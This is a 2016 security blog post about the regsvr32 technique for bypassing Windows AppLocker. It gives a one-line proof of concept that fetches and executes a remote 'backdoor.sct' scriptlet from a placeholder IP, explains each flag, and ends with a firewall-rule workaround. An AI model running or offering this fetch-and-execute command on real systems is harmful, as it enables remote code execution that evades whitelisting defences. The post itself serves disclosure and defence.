---
layout: post
title: Who said that Advanced Exploitation is necessary?! - regsvr32
published: true
date: 2016-04-27 20:45:35
categories: [Vulnerability, Windows, Firewall]

---

{% assign imagedir = "/images/" | prepend: site.baseurl | prepend: site.url   %}
A new vulnerability on Windows has been found on the 25/04/2016 by a security researcher named Casey Smith.

It’s *not clearly a vulnerability* but instead a *feature that is included by design by Microsoft*, which means, *no patch*.

The exploitation use *Regsvr32* to call up a remotely hosted file that could be used to run any application – or malicious content. 
Regsvr32 is signed and trusted by Microsoft - it can bypass AppLocker security policy in order to execute anything on the machine. It is also proxy aware, used TLS, follows redirects, etc.


### Proof Of Concept

	regsvr32 /s /n /u /i:http://x.x.x.x/backdoor.sct scrobj.dll

* Regsvr32: Part of the operating system and can be used to register and unregister COM script files with the Windows Registry
* /s tells Regsvr32 to be silent
* /n tells it not to use DllRegisterServer
* /u unregister an object
* /I pass an optional argument (can be an URL)
* Scrobj.dll Microsoft Script Component Runtime (dll which will be register and unregister)

The URL used in this example will execute the remote script backdoor.sct which contains:

![regsvr32-1.jpg]({{ "regsvr32-1.jpg" | prepend: imagedir}})

Output:

![regsvr32-2.png]({{ "regsvr32-2.png" | prepend: imagedir}}) 

[Proof Of Concept here](https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302)

### This type of exploitation is critical for many reasons:
-	Can take advantage of a high privilege user to execute administration tasks on the machine
-	Can be  used as part of a phishing campaign or other
-	Numerous POC start showing on internet and newbies will be able to use it as bad purposes.
-	Very difficult or impossible to detect as does not leave any trace on disk as it’s pure to-memory download.

### Workaround to block it:

A quick win to block this exploitation to happen would be to create a local firewall rule on each machine as follow:

![regsvr32-3.png]({{ "regsvr32-3.png" | prepend: imagedir}})

![regsvr32-4.png]({{ "regsvr32-4.png" | prepend: imagedir}})

![regsvr32-5.png]({{ "regsvr32-5.png" | prepend: imagedir}})







 
